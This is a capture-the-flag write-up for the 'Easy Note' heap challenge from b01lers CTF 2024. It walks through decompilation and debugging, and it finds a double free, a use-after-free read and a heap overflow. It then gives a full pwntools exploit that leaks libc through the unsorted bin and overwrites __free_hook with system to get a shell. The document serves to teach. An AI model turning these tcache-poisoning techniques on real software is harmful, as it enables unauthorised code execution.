---
linkTitle: Easy Note
title: Easy Note [Writeup]
type: docs
math: True
weight: 7
---
## Challenge Description
> It's a note editor, what could possibly go wrong?

## Solution 
The challenge files provided to us include a `Dockerfile`, a binary and the required `libc` and `linker`. The first thing we'll do is generate a patched binary

```bash
fooker@fooker:~/ctfs/b01lersctf2024/easy-note$ pwninit
bin: ./chal
libc: ./libc.so.6
ld: ./ld-2.27.so

warning: failed detecting libc version (is the libc an Ubuntu glibc?): failed finding version string
copying ./chal to ./chal_patched
running patchelf on ./chal_patched
writing solve.py stub
fooker@fooker:~/ctfs/b01lersctf2024/easy-note$
```

We could inspect the file properties of our patched binaries and run `checksec` to investigate possible mitigations applied on this binary.

```bash
fooker@fooker:~/ctfs/b01lersctf2024/easy-note$ file chal_patched
chal_patched: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=f7af3096b9d7346eed91a5b203f3b1597ea89368, stripped
fooker@fooker:~/ctfs/b01lersctf2024/easy-note$ checksec chal_patched
[*] '~/ctfs/b01lersctf2024/easy-note/chal_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
fooker@fooker:~/ctfs/b01lersctf2024/easy-note$
```

As we can see that the provided binary is stripped which makes debugging painful and the binary has all of the standard security mitigations applied! Let's take a look at the decompilation of the binary in Cutter!

### Decompilation Analysis

Since, the decompiled code is kinda messy and huge, we'll take a look at this step by step.

```c 
#include <stdint.h>

int64_t fcn_00001546 (void) {
    void (*0x1552)() ();
    rax = stdin;
    rdi = stdin;
    al = fgetc ();
    *(var_dh) = al;
    eax = *(var_dh);
    eax -= 0x30;
    *(var_ch) = eax;
    if (*(var_dh) == 0xa) {
        void (*0x163f)() ();
    }
    if (*(var_ch) > 6) {
        goto label_0;
    }
label_0:
    puts ("-----Options---");
    puts ("-----Alloc-----");
    puts ("-----Free------");
    puts ("-----View------");
    puts ("-----Edit------");
    puts ("-----Exit------");
    puts ("-----Resize----");
    void (*0x1552)() ();
    eax = *(var_ch);
    rdx = rax*4;
    rax = 0x000020a8;
    eax = *((rdx + rax));
    rax = (int64_t) eax;
    rdx = 0x000020a8;
    rax += rdx;
    /* switch table (7 cases) at 0x20a8 */
    __asm ("notrack jmp rax");
    eax = 0;
    fcn_00001410 ();
    exit (0);
    eax = 0;
    fcn_000014ea ();
    void (*0x15e6)() ();
    eax = 0;
    fcn_000013c6 ();
    void (*0x15e6)() ();
    eax = 0;
    fcn_000014a6 ();
    void (*0x15e6)() ();
    eax = 0;
    fcn_00001368 ();
    goto label_0;
}
 
int32_t main (void) {
    rax = stdout;
    ecx = 0;
    edx = 2;
    esi = 0;
    rdi = rax;
    setvbuf ();
    rax = stdin;
    ecx = 0;
    edx = 2;
    esi = 0;
    rdi = rax;
    setvbuf ();
    puts ("-----Options---");
    puts ("-----Alloc-----");
    puts ("-----Free------");
    puts ("-----View------");
    puts ("-----Edit------");
    puts ("-----Exit------");
    puts ("-----Resize----");
    eax = 0;
    fcn_00001546 ();
    eax = 0;
    return rax;
}
```

The above decompiled code looks like a menu. It provides us six options and we get to choose either of them. Apparently, it looks like we have 
infinite tries because that menu is embedded inside a while loop. Also for some reason the decompiled code orders the switch cases in the reverse order. Anyway, the first one on the list is the `Alloc()` function 

```c
int64_t fcn_00001289 (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("Where? ");
    rax = var_14h;
    rsi = rax;
    rdi = 0x0000200c;
    eax = 0;
    isoc99_scanf ();
    eax = *(var_14h);
    if (eax >= 0) {
    }
    eax = 0;
    printf ("Illegal idx");
    eax = 0xffffffff;
    void (*0x12f4)() ();
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    void (*0x1308)() ();
    return rax;
    stack_chk_fail ();
    eax = *(var_14h);
}

int64_t fcn_0000130a (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("size? ");
    rax = var_18h;
    rsi = rax;
    rdi = 0x00002022;
    eax = 0;
    isoc99_scanf ();
    rax = *(var_18h);
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    if (? != ?) {
    }
    return rax;
    return stack_chk_fail ();
}

uint64_t fcn_00001368 (void) {
    eax = 0;
    eax = fcn_00001289 ();
    *(var_1ch) = eax;
    if (*(var_1ch) == 0xffffffff) {
        void (*0x13c3)() ();
    }
    eax = 0;
    rax = fcn_0000130a ();
    *(var_18h) = rax;
    rax = *(var_18h);
    rdi = *(var_18h);
    rax = malloc ();
    *(var_10h) = rax;
    eax = *(var_1ch);
    rax = (int64_t) eax;
    rcx = rax*8;
    rdx = 0x00004040;
    rax = *(var_10h);
    *((rcx + rdx)) = rax;
    return rax;
}
```

By the looks of it, the function asks us for the index and probably has a signed check on the input index. It then asks for us the size of the chunk and just mallocs it. Let's take a look at the decompilation of the next function: `free()`

```c
int64_t fcn_00001289 (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("Where? ");
    rax = var_14h;
    rsi = rax;
    rdi = 0x0000200c;
    eax = 0;
    isoc99_scanf ();
    eax = *(var_14h);
    if (eax >= 0) {
    }
    eax = 0;
    printf ("Illegal idx");
    eax = 0xffffffff;
    void (*0x12f4)() ();
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    void (*0x1308)() ();
    return rax;
    stack_chk_fail ();
    eax = *(var_14h);
}

int64_t fcn_000014a6 (void) {
    eax = 0;
    eax = fcn_00001289 ();
    *(var_ch) = eax;
    if (*(var_ch) == 0xffffffff) {
        void (*0x14e7)() ();
    }
    eax = *(var_ch);
    rax = (int64_t) eax;
    rdx = rax*8;
    rax = 0x00004040;
    rax = *((rdx + rax));
    rdi = *((rdx + rax));
    free ();
    return rax;
}
```

The above code snippet again asks us for the index of the chunk to be freed. We still have the signed check on the input index and then it just frees that chunk. We have a `Double Free` vulnerability here since it does not check if the chunk to be freed is already freed and nor is this patched in the version of libc we are using! Let's take a look at the `View()` function!

```c
int64_t fcn_00001289 (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("Where? ");
    rax = var_14h;
    rsi = rax;
    rdi = 0x0000200c;
    eax = 0;
    isoc99_scanf ();
    eax = *(var_14h);
    if (eax >= 0) {
    }
    eax = 0;
    printf ("Illegal idx");
    eax = 0xffffffff;
    void (*0x12f4)() ();
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    void (*0x1308)() ();
    return rax;
    stack_chk_fail ();
    eax = *(var_14h);
}

int64_t fcn_000013c6 (void) {
    eax = 0;
    eax = fcn_00001289 ();
    *(var_ch) = eax;
    if (*(var_ch) == 0xffffffff) {
        void (*0x140d)() ();
    }
    if (*(var_ch) > 0x1f) {
        void (*0x140d)() ();
    }
    eax = *(var_ch);
    rax = (int64_t) eax;
    rdx = rax*8;
    rax = 0x00004040;
    rax = *((rdx + rax));
    puts (*((rdx + rax)));
    return rax;
}
```

It probably just blindly reads the data at the input index chunk. This could potentially be used to leak libc addresses. Let's take a look at the `Edit()` function! 

```c
int64_t fcn_00001289 (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("Where? ");
    rax = var_14h;
    rsi = rax;
    rdi = 0x0000200c;
    eax = 0;
    isoc99_scanf ();
    eax = *(var_14h);
    if (eax >= 0) {
    }
    eax = 0;
    printf ("Illegal idx");
    eax = 0xffffffff;
    void (*0x12f4)() ();
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    void (*0x1308)() ();
    return rax;
    stack_chk_fail ();
    eax = *(var_14h);
}

int64_t fcn_0000130a (void) {
    rax = *(fs:0x28);
    *(var_10h) = rax;
    eax = 0;
    eax = 0;
    printf ("size? ");
    rax = var_18h;
    rsi = rax;
    rdi = 0x00002022;
    eax = 0;
    isoc99_scanf ();
    rax = *(var_18h);
    rdx = *(var_10h);
    rdx ^= *(fs:0x28);
    if (? != ?) {
    }
    return rax;
    return stack_chk_fail ();
}

int64_t fcn_000014ea (void) {
    eax = 0;
    eax = fcn_00001289 ();
    *(var_10h) = eax;
    if (*(var_10h) == 0xffffffff) {
        void (*0x1543)() ();
    }
    eax = 0;
    eax = fcn_0000130a ();
    *(var_ch) = eax;
    eax = *(var_ch);
    rdx = (int64_t) eax;
    eax = *(var_10h);
    rax = (int64_t) eax;
    rcx = rax*8;
    rax = 0x00004040;
    rax = *((rcx + rax));
    read (0, *((rcx + rax)), rdx);
    return rax;
}
```

Basically, we can read into as much data as we want into a chunk of our choice. We could use this to perform a `Heap Overflow` and hijack meta-data of other neighbouring chunks. Overall, there's just too many lucrative vulnerabilities floating around in this program and we could easily put these to our use to get a shell! 

### Leak Libc Addresses through Unsorted Bins
Since, Unsorted Bins are doubly-linked, circular lists and since we can read chunks despite them being freed. This implies, we could just free a chunk and force it into an Unsorted Bin and then just read the first quadword of the user data of that chunk, which would be a pointer to the Unsorted Bin Head inside the main arena. Since, the main arena is loaded at a constant offset from the Libc base address. This leaks the Libc base address and permits us to put any of the other symbols inside the Libc to use. Here's how to do this 

```bash
pwndbg> r
Starting program: ~/ctfs/b01lersctf2024/easy-note/chal_patched
-----Options---
-----Alloc-----
-----Free------
-----View------
-----Edit------
-----Exit------
-----Resize----
1
Where? 0
size? 1048
-----Options---
-----Alloc-----
-----Free------
-----View------
-----Edit------
-----Exit------
-----Resize----
1
Where? 1
size? 32
-----Options---
-----Alloc-----
-----Free------
-----View------
-----Edit------
-----Exit------
-----Resize----
2
Where? 0
-----Options---
-----Alloc-----
-----Free------
-----View------
-----Edit------
-----Exit------
-----Resize----
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b06c41 in __GI___libc_read (fd=0, buf=0x7ffff7dd2a83 <_IO_2_1_stdin_+131>, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:27
27      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────
*RAX  0xfffffffffffffe00
*RBX  0x7ffff7dd2a00 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RCX  0x7ffff7b06c41 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x1
 RDI  0x0
*RSI  0x7ffff7dd2a83 (_IO_2_1_stdin_+131) ◂— 0xdd48d0000000000a /* '\n' */
*R8   0x7ffff7ff5580 ◂— 0x7ffff7ff5580
*R9   0xa
*R10  0x7ffff7dd2a00 (_IO_2_1_stdin_) ◂— 0xfbad208b
*R11  0x246
*R12  0x7ffff7dcf2a0 (__GI__IO_file_jumps) ◂— 0x0
*R13  0x7ffff7dce760 (_IO_helper_jumps) ◂— 0x0
*R14  0x7ffff7dce760 (_IO_helper_jumps) ◂— 0x0
 R15  0x0
*RBP  0xd68
*RSP  0x7fffffffd818 —▸ 0x7ffff7a9bcf6 (__GI__IO_file_underflow+310) ◂— cmp rax, 0
*RIP  0x7ffff7b06c41 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────
 ► 0x7ffff7b06c41 <read+17>    cmp    rax, -0x1000
   0x7ffff7b06c47 <read+23>    ja     read+32                <read+32>
    ↓
   0x7ffff7b06c50 <read+32>    mov    rdx, qword ptr [rip + 0x2cb211]
   0x7ffff7b06c57 <read+39>    neg    eax
   0x7ffff7b06c59 <read+41>    mov    dword ptr fs:[rdx], eax
   0x7ffff7b06c5c <read+44>    mov    rax, 0xffffffffffffffff
   0x7ffff7b06c63 <read+51>    ret

   0x7ffff7b06c64 <read+52>    nop    dword ptr [rax]
   0x7ffff7b06c68 <read+56>    push   r12
   0x7ffff7b06c6a <read+58>    push   rbp
   0x7ffff7b06c6b <read+59>    mov    r12, rdx
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd818 —▸ 0x7ffff7a9bcf6 (__GI__IO_file_underflow+310) ◂— cmp rax, 0
01:0008│     0x7fffffffd820 —▸ 0x7ffff7dd2a00 (_IO_2_1_stdin_) ◂— 0xfbad208b
02:0010│     0x7fffffffd828 —▸ 0x7ffff7dcf2a0 (__GI__IO_file_jumps) ◂— 0x0
03:0018│     0x7fffffffd830 —▸ 0x5555555551a0 ◂— endbr64
04:0020│     0x7fffffffd838 —▸ 0x7fffffffd970 ◂— 0x1
05:0028│     0x7fffffffd840 ◂— 0x0
06:0030│     0x7fffffffd848 —▸ 0x7ffff7a9ce12 (_IO_default_uflow+50) ◂— cmp eax, -1
07:0038│     0x7fffffffd850 —▸ 0x7fffffffd880 —▸ 0x7fffffffd890 —▸ 0x5555555556f0 ◂— endbr64
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► 0   0x7ffff7b06c41 read+17
   1   0x7ffff7a9bcf6 __GI__IO_file_underflow+310
   2   0x7ffff7a9ce12 _IO_default_uflow+50
   3   0x555555555561
   4   0x5555555556e7
   5   0x7ffff7a44b8e __libc_start_main+238
   6   0x5555555551ce
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x555555560250 —▸ 0x7ffff7dd2ca0 (main_arena+96) ◂— 0x555555560250
smallbins
empty
largebins
empty
pwndbg>
```
The strategy is to first `malloc()` a chunk of size outside the tcache bin allocation range. Then to prevent the consolidation of this chunk with the top chunk, we `malloc()` a chunk of a size within the tcache bin allocation range. Hence, we if free the first chunk this would force the heap manager to push the freed chunk into the Unsorted Bin, which is exactly what we needed to leak the Libc address. We could even manually inspect the region of the first chunk and witness that the first quad word of the user data has been repurposed as a back-pointer to the location `[main_arena + 96]` which is the head of the Unsorted Bin.

```bash
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x555555560250 —▸ 0x7ffff7dd2ca0 (main_arena+96) ◂— 0x555555560250
smallbins
empty
largebins
empty
pwndbg> x/10wx 0x555555560250
0x555555560250: 0x00000000      0x00000000      0x00000421      0x00000000
0x555555560260: 0xf7dd2ca0      0x00007fff      0xf7dd2ca0      0x00007fff
0x555555560270: 0x00000000      0x00000000
pwndbg>
```

### Double Free to obtain arbitrary write
Now that we have the Libc base address, we should target one of the Libc functions and overwrite these to hijack the execution of the program. A suitable choice would be to overwrite the `__free_hook()` function pointer with `system()` and then call `free()` with an argument `/bin/sh\x00` to obtain a shell. To set this up, we first need to obtain a write pass at the desirable location. Fortunately, this is very easy now that have a `Double Free` vulnerability. 

We will allocate two chunks of the same size within the Tcache-bin's linking range and then free the first one twice. We shall then modify the first quadword of the user data region of the first chunk with the address of `__free_hook()`. Hence, the next time we `malloc()` a chunk of the same size, the Tcache-bin's Head pointer points to `__free_hook()`. We need to perform another `malloc()` of the same size to get a chunk pointer at `__free_hook()` which would then be just over-written by the function pointer to `system()`. 

Hereforth, we simply need to perform another `malloc()` and write in `/bin/sh\x00` in the user data region. When we free up this chunk, it would call `system()` with the arguments `/bin/sh\x00` passed in and that would get us shell! 

```py {filename=exploit.py linenos=table}
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-2.27.so", checksec = False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

def alloc(index, size):
    r.sendline(b'1')
    r.sendlineafter(b"Where? ", str(index).encode())
    r.sendlineafter(b"size? ", str(size).encode())

def free(index):
    r.sendline(b'2')
    r.sendlineafter(b"Where? ", str(index).encode())

def view(index):
    r.sendline(b'3')
    r.sendlineafter(b"Where? ", str(index).encode())
    return r.recvline()[:-1]

def edit(index, size, data):
    r.sendline(b'4')
    r.sendlineafter(b"Where? ", str(index).encode())
    r.sendlineafter(b"size? ", str(size).encode())
    r.sendline(data)

alloc(0, 1280)
alloc(1, 32)

## chunk gets stored in the unsorted bin 
free(0) 

## read the fd pointer 
main_arena = u64(view(0).ljust(8, b'\x00')) 
libc_base = main_arena - 0x3afca0
libc.address = libc_base

info(f"Libc Address => {libc.address}")

system = libc.sym.system
free_hook = libc.sym.__free_hook

## overwriting the free_hook with system
alloc(2, 32)
free(2)
free(2)

edit(2, 32, p64(free_hook))
alloc(3, 32)
alloc(4, 32)

edit(4, 32, p64(system))

## call system with /bin/sh param
alloc(6, 32)
edit(6, 32, b'/bin/sh\x00')

free(6)

r.interactive()

```

which gets us the shell as we desired!

```bash
fooker@fooker:~/ctfs/pwn/learn/exploitation-notebook/binary-exploitation/ctfs/b01lersctf2024/easy-note$ python3 exploit.py
[*] '/home/fooker/ctfs/pwn/learn/exploitation-notebook/binary-exploitation/ctfs/b01lersctf2024/easy-note/chal_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Starting local process './chal_patched': pid 1685832
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x5 bytes:
    b'1280\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x70 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
[DEBUG] Received 0x7 bytes:
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x70 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
[DEBUG] Received 0x7 bytes:
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x77 bytes:
    00000000  a0 2c 3e d8  2b 7f 0a 2d  2d 2d 2d 2d  4f 70 74 69  │·,>·│+··-│----│Opti│
    00000010  6f 6e 73 2d  2d 2d 0a 2d  2d 2d 2d 2d  41 6c 6c 6f  │ons-│--·-│----│Allo│
    00000020  63 2d 2d 2d  2d 2d 0a 2d  2d 2d 2d 2d  46 72 65 65  │c---│--·-│----│Free│
    00000030  2d 2d 2d 2d  2d 2d 0a 2d  2d 2d 2d 2d  56 69 65 77  │----│--·-│----│View│
    00000040  2d 2d 2d 2d  2d 2d 0a 2d  2d 2d 2d 2d  45 64 69 74  │----│--·-│----│Edit│
    00000050  2d 2d 2d 2d  2d 2d 0a 2d  2d 2d 2d 2d  45 78 69 74  │----│--·-│----│Exit│
    00000060  2d 2d 2d 2d  2d 2d 0a 2d  2d 2d 2d 2d  52 65 73 69  │----│--·-│----│Resi│
    00000070  7a 65 2d 2d  2d 2d 0a                               │ze--│--·│
    00000077
[*] Libc Address => 139826284408832
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x70 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
[DEBUG] Received 0x7 bytes:
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x9 bytes:
    00000000  e8 48 3e d8  2b 7f 00 00  0a                        │·H>·│+···│·│
    00000009
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x9 bytes:
    00000000  70 47 07 d8  2b 7f 00 00  0a                        │pG··│+···│·│
    00000009
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0x6 bytes:
    b'size? '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Sent 0x9 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
    00000009
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x77 bytes:
    b'-----Options---\n'
    b'-----Alloc-----\n'
    b'-----Free------\n'
    b'-----View------\n'
    b'-----Edit------\n'
    b'-----Exit------\n'
    b'-----Resize----\n'
    b'Where? '
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xdc bytes:
    b'Dockerfile\t  chal_patched\t  ld-2.27.so\n'
    b'chal\t\t   libc.so.6\n'
    b'exploit.py\t\t  solve.py\n'
    b'flag.txt\n'
Dockerfile      chal_patched  ld-2.27.so
chal        libc.so.6
exploit.py          solve.py
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x28 bytes:
    b'bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}\n'
bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}
$ 
```

## Flag
```
bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}
```